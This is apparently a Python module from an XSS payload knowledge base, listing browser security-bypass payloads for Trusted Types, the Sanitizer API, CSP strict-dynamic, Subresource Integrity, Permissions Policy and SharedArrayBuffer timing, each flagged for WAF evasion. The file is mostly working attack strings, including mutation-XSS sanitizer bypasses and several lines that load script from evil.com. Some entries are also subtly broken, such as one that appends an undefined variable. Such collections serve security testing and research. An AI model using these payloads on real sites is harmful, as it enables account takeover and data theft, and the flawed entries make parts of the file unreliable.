#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Active
Telegram: https://t.me/EasyProTech

Security Mechanism Bypass XSS Payloads
Trusted Types, Sanitizer API, CSP, COOP/COEP, Permissions Policy, SRI, etc.
"""

from ..models import Encoding, PayloadEntry, Reliability, Severity


# === Trusted Types Bypass Payloads ===
TRUSTED_TYPES_PAYLOADS = {
    "tt-default-policy-bypass": PayloadEntry(
        payload='trustedTypes.createPolicy("default", { createHTML: (s) => s }); element.innerHTML = userInput;',
        contexts=["trusted_types", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Trusted Types default policy that allows everything",
        tags=["trusted-types", "policy", "default", "bypass"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "tt-policy-name-injection": PayloadEntry(
        payload="trustedTypes.createPolicy(userInput, { createHTML: (s) => s });",
        contexts=["trusted_types", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Trusted Types policy name injection",
        tags=["trusted-types", "policy", "name", "injection"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "tt-svg-use": PayloadEntry(
        payload="<svg><use href=\"data:image/svg+xml,<svg id=x xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x\"></use></svg>",
        contexts=["trusted_types", "html_content", "svg"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="SVG use href bypass for Trusted Types",
        tags=["trusted-types", "svg", "use", "href"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "tt-require-bypass": PayloadEntry(
        payload="// With require-trusted-types-for 'script'\n// Dynamic import bypass\nimport(userControlledURL)",
        contexts=["trusted_types", "javascript"],
        severity=Severity.HIGH,
        cvss_score=8.0,
        description="Dynamic import bypassing Trusted Types",
        tags=["trusted-types", "import", "dynamic", "bypass"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Sanitizer API Bypass Payloads ===
SANITIZER_API_PAYLOADS = {
    "sanitizer-api-mxss": PayloadEntry(
        payload="<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
        contexts=["sanitizer_api", "html_content", "mutation"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Sanitizer API mXSS bypass via math/table",
        tags=["sanitizer-api", "mxss", "math", "mutation"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "sanitizer-nesting-confusion": PayloadEntry(
        payload='<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img src=x onerror=alert(1)>">',
        contexts=["sanitizer_api", "html_content", "mutation"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Sanitizer namespace confusion mXSS",
        tags=["sanitizer-api", "nesting", "namespace", "mxss"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "sanitizer-custom-config": PayloadEntry(
        payload='new Sanitizer({ allowElements: ["script"] }).sanitize(html)',
        contexts=["sanitizer_api", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Sanitizer API with unsafe allowElements",
        tags=["sanitizer-api", "config", "allowElements", "unsafe"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === CSP strict-dynamic Bypass Payloads ===
CSP_STRICT_DYNAMIC_PAYLOADS = {
    "csp-strict-dynamic-base": PayloadEntry(
        payload='<base href="https://evil.com/"><script src="/app.js"></script>',
        contexts=["csp_strict_dynamic", "html_content", "csp_bypass"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="CSP strict-dynamic base tag hijacking",
        tags=["csp", "strict-dynamic", "base", "hijack"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "csp-strict-dynamic-trusted-script": PayloadEntry(
        payload='document.createElement("script").src = "https://evil.com/xss.js"; document.body.appendChild(s);',
        contexts=["csp_strict_dynamic", "javascript", "csp_bypass"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="CSP strict-dynamic allows trusted script to load more",
        tags=["csp", "strict-dynamic", "createElement", "propagation"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "csp-strict-dynamic-jsonp": PayloadEntry(
        payload='<script src="https://trusted.com/jsonp?callback=alert"></script>',
        contexts=["csp_strict_dynamic", "html_content", "csp_bypass"],
        severity=Severity.HIGH,
        cvss_score=8.0,
        description="CSP bypass via JSONP on trusted domain",
        tags=["csp", "strict-dynamic", "jsonp", "callback"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Cross-Origin Isolated Payloads ===
CROSS_ORIGIN_ISOLATED_PAYLOADS = {
    "coi-spectre-timer": PayloadEntry(
        payload="const sharedBuffer = new SharedArrayBuffer(1024); // Requires COOP/COEP",
        contexts=["cross_origin_isolated", "javascript", "shared_array_buffer"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="SharedArrayBuffer requires cross-origin isolation",
        tags=["coi", "spectre", "sharedarraybuffer", "timing"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "coi-performance-now": PayloadEntry(
        payload="const start = performance.now(); /* high-res timing attack */",
        contexts=["cross_origin_isolated", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="High-resolution timing with cross-origin isolation",
        tags=["coi", "timing", "performance", "spectre"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Origin Isolation Payloads ===
ORIGIN_ISOLATION_PAYLOADS = {
    "origin-isolation-bypass": PayloadEntry(
        payload="// With Origin-Agent-Cluster header\nwindow.opener.location // May still work",
        contexts=["origin_isolation", "javascript"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="Origin isolation opener access",
        tags=["origin", "isolation", "opener", "access"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Origin Trial Payloads ===
ORIGIN_TRIAL_PAYLOADS = {
    "origin-trial-experimental": PayloadEntry(
        payload='<meta http-equiv="origin-trial" content="TOKEN_FOR_EXPERIMENTAL_API">',
        contexts=["origin_trial", "html_content"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="Origin trial token for experimental API",
        tags=["origin-trial", "experimental", "api", "token"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "origin-trial-deprecation": PayloadEntry(
        payload='<meta http-equiv="origin-trial" content="DEPRECATED_API_TOKEN">',
        contexts=["origin_trial", "html_content"],
        severity=Severity.LOW,
        cvss_score=3.0,
        description="Origin trial for deprecated API access",
        tags=["origin-trial", "deprecation", "legacy", "api"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Permissions Policy Payloads ===
PERMISSIONS_POLICY_PAYLOADS = {
    "permissions-policy-bypass-iframe": PayloadEntry(
        payload='<iframe allow="geolocation *" src="https://evil.com/geo.html"></iframe>',
        contexts=["permissions_policy", "html_content"],
        severity=Severity.MEDIUM,
        cvss_score=5.5,
        description="Permissions Policy iframe allow override",
        tags=["permissions-policy", "iframe", "allow", "geolocation"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "permissions-policy-interest-cohort": PayloadEntry(
        payload="document.interestCohort() // FLoC API if not blocked",
        contexts=["permissions_policy", "javascript"],
        severity=Severity.LOW,
        cvss_score=3.0,
        description="Interest Cohort (FLoC) API access",
        tags=["permissions-policy", "floc", "privacy", "tracking"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === Subresource Integrity Bypass Payloads ===
SUBRESOURCE_INTEGRITY_PAYLOADS = {
    "sri-bypass-dynamic": PayloadEntry(
        payload='const s = document.createElement("script"); s.src = "https://evil.com/xss.js"; document.body.appendChild(s);',
        contexts=["subresource_integrity", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="SRI bypass via dynamic script creation",
        tags=["sri", "bypass", "dynamic", "createElement"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "sri-hash-mismatch-fallback": PayloadEntry(
        payload='<script src="https://cdn.com/lib.js" integrity="sha384-INVALID" onerror="alert(1)"></script>',
        contexts=["subresource_integrity", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="SRI hash mismatch onerror fallback",
        tags=["sri", "hash", "onerror", "fallback"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === SharedArrayBuffer Payloads ===
SHARED_ARRAY_BUFFER_PAYLOADS = {
    "sab-spectre-gadget": PayloadEntry(
        payload="const sab = new SharedArrayBuffer(4096); const view = new Uint8Array(sab); // High-precision timer",
        contexts=["shared_array_buffer", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="SharedArrayBuffer for Spectre timing gadget",
        tags=["sharedarraybuffer", "spectre", "timing", "side-channel"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "sab-worker-timing": PayloadEntry(
        payload="// In worker: Atomics.wait(sharedArray, 0, 0, 0); // High-precision timing",
        contexts=["shared_array_buffer", "javascript", "webworker"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="SharedArrayBuffer worker timing attack",
        tags=["sharedarraybuffer", "worker", "atomics", "timing"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# Combined database
SECURITY_BYPASS_PAYLOADS = {
    **TRUSTED_TYPES_PAYLOADS,
    **SANITIZER_API_PAYLOADS,
    **CSP_STRICT_DYNAMIC_PAYLOADS,
    **CROSS_ORIGIN_ISOLATED_PAYLOADS,
    **ORIGIN_ISOLATION_PAYLOADS,
    **ORIGIN_TRIAL_PAYLOADS,
    **PERMISSIONS_POLICY_PAYLOADS,
    **SUBRESOURCE_INTEGRITY_PAYLOADS,
    **SHARED_ARRAY_BUFFER_PAYLOADS,
}

SECURITY_BYPASS_TOTAL = len(SECURITY_BYPASS_PAYLOADS)
